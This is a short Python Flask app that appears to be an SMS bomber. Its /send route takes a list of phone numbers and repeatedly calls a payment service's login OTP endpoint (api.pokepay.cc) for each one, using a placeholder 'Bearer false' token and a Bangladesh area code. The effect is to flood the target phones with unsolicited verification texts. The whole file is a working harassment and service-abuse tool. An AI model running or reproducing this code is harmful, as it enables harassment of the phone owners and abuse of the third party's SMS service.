from flask import Flask, render_template, request, jsonify
import requests
import time

app = Flask(__name__)

def send_sms(number):
    url = "https://api.pokepay.cc/home/index/smsSend"
    headers = {
        "Content-Type": "application/json;charset=utf-8",
        "Platform": "H5",
        "Authorization": "Bearer false",
        "Accept-Language": "en-US"
    }
    data = {"mobile": number, "event": "login", "area_code": 880}
    try:
        r = requests.post(url, headers=headers, json=data, timeout=10)
        return {"number": number, "status": "Success" if r.status_code == 200 else "Failed"}
    except:
        return {"number": number, "status": "Error"}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send', methods=['POST'])
def handle_send():
    numbers_input = request.json.get('numbers', '')
    numbers = [n.strip() for n in numbers_input.replace(",", " ").split() if n.strip()]
    
    results = []
    for num in numbers:
        if num.isdigit() and len(num) >= 10:
            res = send_sms(num)
            results.append(res)
            time.sleep(0.5)
    return jsonify(results)

if __name__ == '__main__':
    app.run(debug=True)
  
